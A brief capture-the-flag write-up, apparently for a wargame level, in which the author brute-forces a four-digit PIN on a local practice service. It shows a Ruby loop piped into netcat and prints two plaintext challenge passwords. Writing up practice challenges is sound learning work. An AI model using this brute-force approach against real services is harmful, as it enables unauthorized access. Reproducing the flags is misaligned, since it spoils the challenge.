I came very close to brute-forcing this using `telnetlib` in Python but kept
getting "connection reset by peer" exceptions but found out that netcat can be
used here again. (Note to self: learn more about netcat.) I did the `mktemp
-d` thing as previously mentioned and wrote the following Ruby code as
`brute-force.rb`:

```ruby
(0..9999).each do |i|
    puts 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ' + i.to_s.rjust(4, '0')
end
```

These commands were spammed like so: `ruby brute-force.rb | nc localhost
30002`, giving me the password: `uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG`.
